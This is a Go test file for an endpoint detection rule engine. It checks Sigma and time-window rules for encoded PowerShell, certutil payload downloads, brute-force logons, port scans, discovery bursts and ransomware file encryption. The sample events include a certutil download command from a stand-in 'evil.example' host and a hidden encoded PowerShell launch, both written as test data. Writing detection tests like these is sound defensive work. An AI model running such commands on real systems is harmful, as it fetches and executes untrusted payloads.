package rules

import (
	"context"
	"fmt"
	"testing"
	"time"
)

// ─── helpers ────────────────────────────────────────────────────────────────

func sigmaRule(id, content string) *DetectionRule {
	return &DetectionRule{ID: id, Name: id, Type: "sigma", Enabled: true, Severity: 80, Content: content}
}

func behavioralRule(id, content string) *DetectionRule {
	return &DetectionRule{ID: id, Name: id, Type: "behavioral", Enabled: true, Severity: 70, Content: content}
}

func hasRule(matches []*RuleMatch, id string) bool {
	for _, m := range matches {
		if m.RuleID == id {
			return true
		}
	}
	return false
}

// ─── Sigma: realistic attack patterns ───────────────────────────────────────

// Encoded PowerShell (T1059.001) — Sigma field mapping Image→imagePath,
// CommandLine→commandLine must resolve our agent's JSON field names.
func TestRuleEngine_Sigma_EncodedPowerShell(t *testing.T) {
	const content = `
title: Encoded PowerShell
level: high
detection:
  selection:
    Image|endswith: \powershell.exe
    CommandLine|contains: -enc
  condition: selection
`
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{sigmaRule("enc-ps", content)})

	attack := map[string]interface{}{
		"type":        "process",
		"agent_id":    "host-1",
		"imagePath":   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"commandLine": `powershell -nop -w hidden -enc SQBFAFgA`,
	}
	matches, err := e.Evaluate(context.Background(), attack)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if !hasRule(matches, "enc-ps") {
		t.Fatalf("encoded-powershell attack should match, got %d matches", len(matches))
	}

	// A benign powershell invocation (no -enc) must NOT match.
	benign := map[string]interface{}{
		"type":        "process",
		"agent_id":    "host-1",
		"imagePath":   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"commandLine": `powershell Get-Process`,
	}
	if m, _ := e.Evaluate(context.Background(), benign); hasRule(m, "enc-ps") {
		t.Errorf("benign powershell should not match the encoded-command rule")
	}
}

// LOLBin: certutil used to download a payload (T1105). Exercises |contains on
// two fields plus the CommandLine mapping.
func TestRuleEngine_Sigma_CertutilDownload(t *testing.T) {
	const content = `
title: Certutil Download
level: high
detection:
  selection:
    Image|endswith: \certutil.exe
    CommandLine|contains:
      - -urlcache
      - -f
  condition: selection
`
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{sigmaRule("certutil-dl", content)})

	attack := map[string]interface{}{
		"type":        "process",
		"agent_id":    "host-2",
		"imagePath":   `C:\Windows\System32\certutil.exe`,
		"commandLine": `certutil -urlcache -f http://evil.example/x.exe x.exe`,
	}
	m, err := e.Evaluate(context.Background(), attack)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if !hasRule(m, "certutil-dl") {
		t.Fatalf("certutil download should match")
	}
}

// A disabled rule must never fire even on a matching event.
func TestRuleEngine_DisabledRuleSkipped(t *testing.T) {
	const content = `
title: Disabled
detection:
  selection:
    Image|endswith: \evil.exe
  condition: selection
`
	r := sigmaRule("disabled", content)
	r.Enabled = false
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{r})

	m, _ := e.Evaluate(context.Background(), map[string]interface{}{
		"type": "process", "agent_id": "h", "imagePath": `C:\tmp\evil.exe`,
	})
	if hasRule(m, "disabled") {
		t.Errorf("disabled rule should not fire")
	}
}

// Malformed Sigma content must not crash LoadRules; the engine keeps running.
func TestRuleEngine_BadSigmaTolerated(t *testing.T) {
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{
		sigmaRule("broken", "::: not yaml :::"),
		sigmaRule("ok", "title: Ok\ndetection:\n  selection:\n    Image|endswith: \\x.exe\n  condition: selection\n"),
	})
	// The good rule still evaluates.
	m, _ := e.Evaluate(context.Background(), map[string]interface{}{
		"type": "process", "agent_id": "h", "imagePath": `C:\a\x.exe`,
	})
	if !hasRule(m, "ok") {
		t.Errorf("valid rule should still match after a sibling failed to compile")
	}
}

func TestRuleEngine_EvaluateRejectsNonMap(t *testing.T) {
	e := NewRuleEngine()
	if _, err := e.Evaluate(context.Background(), "not-a-map"); err == nil {
		t.Errorf("Evaluate should reject non-map input")
	}
}

// ─── Behavioral key:value (AND) rules ───────────────────────────────────────

func TestRuleEngine_BehavioralAndLogic(t *testing.T) {
	// Plain key:value behavioral rule (no window/threshold → not a sequence rule).
	rule := behavioralRule("susp-ps", "processName: powershell\ncommandLine: -enc")
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{rule})

	// Both conditions present → match.
	m, _ := e.Evaluate(context.Background(), map[string]interface{}{
		"type": "process", "agent_id": "h",
		"processName": "powershell.exe", "commandLine": "powershell -enc AAAA",
	})
	if !hasRule(m, "susp-ps") {
		t.Fatalf("behavioral rule with both fields should match")
	}

	// Only one condition present → no match (AND semantics).
	m, _ = e.Evaluate(context.Background(), map[string]interface{}{
		"type": "process", "agent_id": "h",
		"processName": "powershell.exe", "commandLine": "powershell Get-Help",
	})
	if hasRule(m, "susp-ps") {
		t.Errorf("behavioral rule should require ALL fields to match")
	}
}

func TestRuleEngine_GetRule(t *testing.T) {
	e := NewRuleEngine()
	r := behavioralRule("x", "processName: cmd")
	e.LoadRules([]*DetectionRule{r})
	if e.GetRule("x") == nil {
		t.Errorf("GetRule should return the loaded rule")
	}
	if e.GetRule("missing") != nil {
		t.Errorf("GetRule should return nil for unknown id")
	}
}

// ─── SequenceEngine: time-window attack correlation ─────────────────────────

const bruteForceRule = `
window: 5s
threshold: 5
event_type: auth
field: action
value: login_failure
`

// Brute force (T1110): 5 failed logons within the window must fire on the 5th.
func TestSequenceEngine_BruteForce(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute", bruteForceRule)})

	evt := map[string]interface{}{"action": "login_failure"}
	for i := 1; i <= 4; i++ {
		if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
			t.Fatalf("should not fire on attempt %d", i)
		}
	}
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute") {
		t.Fatalf("brute force should fire on the 5th failed logon")
	}
}

// Successful logons (wrong field value) must not advance the brute-force counter.
func TestSequenceEngine_BruteForce_IgnoresSuccess(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute", bruteForceRule)})

	for i := 0; i < 10; i++ {
		if m := se.Observe("host-1", "auth", map[string]interface{}{"action": "login_success"}); len(m) != 0 {
			t.Fatalf("successful logons must never fire the brute-force rule")
		}
	}
}

// group_by partitions counters per source IP: two IPs below threshold do not
// fire; the rule fires only when a single IP reaches the threshold.
func TestSequenceEngine_BruteForce_PerSourceIP(t *testing.T) {
	const rule = `
window: 10s
threshold: 3
event_type: auth
field: action
value: login_failure
group_by: srcIp
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute-ip", rule)})

	fail := func(ip string) []*RuleMatch {
		return se.Observe("host-1", "auth", map[string]interface{}{"action": "login_failure", "srcIp": ip})
	}

	// Two attempts from each of two IPs → neither group reaches 3.
	for _, ip := range []string{"10.0.0.1", "10.0.0.2", "10.0.0.1", "10.0.0.2"} {
		if m := fail(ip); len(m) != 0 {
			t.Fatalf("no IP has reached the threshold yet, unexpected fire for %s", ip)
		}
	}
	// Third attempt from .1 → that partition reaches 3 → fire.
	if m := fail("10.0.0.1"); !hasRule(m, "brute-ip") {
		t.Fatalf("per-IP brute force should fire when one source reaches the threshold")
	}
}

// Port scan (T1046): count of DISTINCT destination ports within the window.
func TestSequenceEngine_PortScanDistinct(t *testing.T) {
	const rule = `
window: 10s
threshold: 5
event_type: network
distinct: true
distinct_field: dstPort
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("portscan", rule)})

	probe := func(port string) []*RuleMatch {
		return se.Observe("host-1", "network", map[string]interface{}{"dstPort": port})
	}

	// 4 distinct ports → below threshold.
	for _, p := range []string{"22", "80", "443", "3389"} {
		if m := probe(p); len(m) != 0 {
			t.Fatalf("4 distinct ports must not fire")
		}
	}
	// Repeating an already-seen port does not increase the distinct count.
	if m := probe("443"); len(m) != 0 {
		t.Fatalf("repeated port should not advance the distinct count")
	}
	// 5th distinct port → fire.
	if m := probe("8080"); !hasRule(m, "portscan") {
		t.Fatalf("port scan should fire on the 5th distinct port")
	}
}

// event_type filter: events of a non-matching type are ignored.
func TestSequenceEngine_EventTypeFilter(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute", bruteForceRule)})

	// Five process events with action=login_failure but wrong event_type → no fire.
	for i := 0; i < 5; i++ {
		if m := se.Observe("host-1", "process", map[string]interface{}{"action": "login_failure"}); len(m) != 0 {
			t.Fatalf("events of the wrong type must not count toward the auth rule")
		}
	}
}

// cooldown suppresses repeated fires for the same group within the interval.
func TestSequenceEngine_Cooldown(t *testing.T) {
	const rule = `
window: 10s
threshold: 2
event_type: auth
field: action
value: login_failure
cooldown: 10s
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute-cd", rule)})

	evt := map[string]interface{}{"action": "login_failure"}
	if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
		t.Fatalf("should not fire on first event")
	}
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute-cd") {
		t.Fatalf("should fire on second event (threshold reached)")
	}
	// Further events within the cooldown window must be suppressed.
	for i := 0; i < 3; i++ {
		if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
			t.Fatalf("cooldown should suppress repeat fires")
		}
	}
}

// Without an explicit cooldown directive a sane default still suppresses repeat
// fires, so one ongoing incident (e.g. a discovery burst) does not flood alerts.
func TestSequenceEngine_DefaultCooldown(t *testing.T) {
	const rule = `
window: 10s
threshold: 2
event_type: auth
field: action
value: login_failure
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute-default", rule)})

	evt := map[string]interface{}{"action": "login_failure"}
	se.Observe("host-1", "auth", evt) // 1st: below threshold
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute-default") {
		t.Fatalf("should fire when threshold reached")
	}
	// Subsequent qualifying events must be suppressed by the DEFAULT cooldown
	// even though the rule sets no explicit cooldown directive.
	for i := 0; i < 3; i++ {
		if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
			t.Fatalf("default cooldown should suppress repeat fires")
		}
	}
}

// An explicit "cooldown: 0" opts out of the default and allows re-fires.
func TestSequenceEngine_CooldownZeroOptsOut(t *testing.T) {
	const rule = `
window: 10s
threshold: 2
event_type: auth
field: action
value: login_failure
cooldown: 0
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute-nocd", rule)})

	evt := map[string]interface{}{"action": "login_failure"}
	se.Observe("host-1", "auth", evt)
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute-nocd") {
		t.Fatalf("should fire when threshold reached")
	}
	// With cooldown:0 the threshold stays satisfied (≥2 events in the window),
	// so the next qualifying event fires again instead of being suppressed.
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute-nocd") {
		t.Fatalf("cooldown:0 should allow re-fire")
	}
}

// Events that fall outside the window are pruned and do not count.
func TestSequenceEngine_WindowExpiry(t *testing.T) {
	const rule = `
window: 300ms
threshold: 3
event_type: auth
field: action
value: login_failure
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("brute-win", rule)})

	evt := map[string]interface{}{"action": "login_failure"}
	// Two events, then let the window elapse.
	se.Observe("host-1", "auth", evt)
	se.Observe("host-1", "auth", evt)
	time.Sleep(400 * time.Millisecond)

	// The two stale events are now outside the window; a fresh burst of two
	// is still below threshold (the old ones must not be counted).
	if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
		t.Fatalf("stale events should have expired, no fire expected")
	}
	if m := se.Observe("host-1", "auth", evt); len(m) != 0 {
		t.Fatalf("only 2 fresh events within window, no fire expected")
	}
	// Third fresh event within the window → fire.
	if m := se.Observe("host-1", "auth", evt); !hasRule(m, "brute-win") {
		t.Fatalf("three fresh events within the window should fire")
	}
}

// Non-sequence behavioral rules (no window/threshold) are ignored by the
// sequence engine without error.
func TestSequenceEngine_IgnoresPlainBehavioral(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("plain", "processName: cmd")})
	if m := se.Observe("host-1", "process", map[string]interface{}{"processName": "cmd.exe"}); len(m) != 0 {
		t.Fatalf("plain key:value behavioral rules are not sequence rules")
	}
}

// End-to-end through RuleEngine.Evaluate: the brute-force sequence fires while
// the per-event behavioral check on the same rule stays silent.
func TestRuleEngine_SequenceIntegration(t *testing.T) {
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{behavioralRule("brute", bruteForceRule)})

	evt := map[string]interface{}{"type": "auth", "agent_id": "host-9", "action": "login_failure"}
	var fired bool
	for i := 0; i < 5; i++ {
		m, err := e.Evaluate(context.Background(), evt)
		if err != nil {
			t.Fatalf("Evaluate: %v", err)
		}
		if hasRule(m, "brute") {
			fired = true
		}
	}
	if !fired {
		t.Fatalf("brute-force sequence should fire through RuleEngine.Evaluate")
	}
}

// value_any: an event matches when the field contains ANY listed value.
// Non-listed values must not count toward the threshold.
func TestSequenceEngine_ValueAny(t *testing.T) {
	const rule = `
window: 10s
threshold: 3
event_type: process
field: processName
value_any: whoami, tasklist, systeminfo, ipconfig
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("disc", rule)})

	run := func(name string) []*RuleMatch {
		return se.Observe("host-1", "process", map[string]interface{}{"processName": name})
	}

	// A non-listed process must not advance the counter.
	if m := run("chrome.exe"); len(m) != 0 {
		t.Fatalf("non-listed process must not count toward value_any rule")
	}
	// Two listed processes → below threshold.
	if m := run("whoami.exe"); len(m) != 0 {
		t.Fatalf("1 match below threshold")
	}
	if m := run("tasklist.exe"); len(m) != 0 {
		t.Fatalf("2 matches below threshold")
	}
	// Third listed process → fire.
	if m := run("ipconfig.exe"); !hasRule(m, "disc") {
		t.Fatalf("value_any rule should fire when 3 listed processes match")
	}
}

// value_any + value together use OR semantics: an event matches if it satisfies
// either the single value OR any value_any entry.
func TestSequenceEngine_ValueAny_OrWithValue(t *testing.T) {
	const rule = `
window: 10s
threshold: 2
event_type: process
field: processName
value: regsvr32
value_any: whoami, tasklist
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("orv", rule)})

	run := func(name string) []*RuleMatch {
		return se.Observe("host-1", "process", map[string]interface{}{"processName": name})
	}
	// First a `value` match, then a `value_any` match → threshold reached via OR.
	if m := run("regsvr32.exe"); len(m) != 0 {
		t.Fatalf("1 match below threshold")
	}
	if m := run("whoami.exe"); !hasRule(m, "orv") {
		t.Fatalf("value OR value_any should reach threshold")
	}
}

// Discovery burst (T1033/T1057/T1082/…): the shipped value_any rule counts
// DISTINCT discovery tools, so a single repeated command never fires but a
// burst of several different discovery commands does. This mirrors the
// production rule in migration 004 and the ATT&CK corpus discovery cluster
// that single-event Sigma intentionally ignores as noise.
func TestSequenceEngine_DiscoveryBurst(t *testing.T) {
	const rule = `
window: 60s
threshold: 4
event_type: process
field: processName
value_any: whoami, tasklist, systeminfo, ipconfig, hostname, net.exe, nltest, arp, route, netstat, findstr
distinct: true
distinct_field: processName
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("disc-burst", rule)})

	run := func(name string) []*RuleMatch {
		return se.Observe("host-1", "process", map[string]interface{}{"processName": name})
	}

	// Repeating the SAME discovery command does not advance the distinct count.
	for i := 0; i < 5; i++ {
		if m := run("whoami.exe"); len(m) != 0 {
			t.Fatalf("repeated identical discovery command must not fire (iteration %d)", i)
		}
	}
	// Distinct discovery commands accumulate: tasklist(2), systeminfo(3), …
	if m := run("tasklist.exe"); len(m) != 0 {
		t.Fatalf("2 distinct discovery tools below threshold")
	}
	if m := run("systeminfo.exe"); len(m) != 0 {
		t.Fatalf("3 distinct discovery tools below threshold")
	}
	// 4th distinct discovery tool → discovery burst fires.
	if m := run("ipconfig.exe"); !hasRule(m, "disc-burst") {
		t.Fatalf("discovery burst should fire on the 4th distinct discovery tool")
	}
}

// Ransomware mass encryption (T1486): a burst of distinct files changing to a
// ransomware extension fires; a few renames and non-ransomware files do not.
func TestSequenceEngine_RansomwareEncryption(t *testing.T) {
	const rule = `
window: 60s
threshold: 20
event_type: file
field: path
value_any: .locked, .encrypted, .crypt, .ryuk, .lockbit
distinct: true
distinct_field: path
group_by: agent_id
`
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{behavioralRule("ransom", rule)})

	touch := func(path string) []*RuleMatch {
		return se.Observe("host-1", "file", map[string]interface{}{"path": path})
	}

	// Files without a ransomware extension must not count, no matter how many.
	for i := 0; i < 30; i++ {
		if m := touch(fmt.Sprintf(`C:\Users\v\doc%d.docx`, i)); len(m) != 0 {
			t.Fatalf("ordinary file writes must not fire the ransomware rule")
		}
	}

	// 19 distinct encrypted files → still below threshold.
	for i := 0; i < 19; i++ {
		if m := touch(fmt.Sprintf(`C:\Users\v\doc%d.docx.locked`, i)); len(m) != 0 {
			t.Fatalf("19 encrypted files below threshold, unexpected fire at %d", i)
		}
	}
	// Re-encrypting an already-seen path does not advance the distinct count.
	if m := touch(`C:\Users\v\doc0.docx.locked`); len(m) != 0 {
		t.Fatalf("duplicate path must not advance the distinct count")
	}
	// 20th distinct encrypted file → ransomware burst fires.
	if m := touch(`C:\Users\v\doc19.docx.locked`); !hasRule(m, "ransom") {
		t.Fatalf("ransomware rule should fire on the 20th distinct encrypted file")
	}
}
